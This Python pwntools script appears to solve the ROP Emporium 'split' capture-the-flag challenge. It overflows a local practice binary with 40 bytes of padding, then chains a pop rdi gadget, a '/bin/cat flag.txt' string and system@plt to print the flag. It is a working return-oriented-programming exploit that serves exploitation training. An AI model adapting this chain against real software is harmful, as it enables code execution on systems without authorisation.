from pwn import *

#0x004005e0    1 6            sym.imp.system
#000 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt
#root@pochinki:~/ropemporium# objdump -d split | grep system
#00000000004005e0 <system@plt>:
#  4005e0:	ff 25 3a 0a 20 00    	jmpq   *0x200a3a(%rip)        # 601020 <system@GLIBC_2.2.5>
#  400810:	e8 cb fd ff ff       	callq  4005e0 <system@plt>
#0x0000000000400883: pop rdi; ret; 

def main():
	system_plt = 0x004005e0
	poprdi = 0x00400883
	bincat = 0x00601060
	payload = 'A' * 40
	
	payload += p64(poprdi)
	payload += p64(bincat)

	payload += p64(system_plt)
	
	p = process('./split')
	print p.recvrepeat(0.2)
	p.sendline(payload)
	print p.recvrepeat(0.2) 
if __name__ == '__main__':
	main()
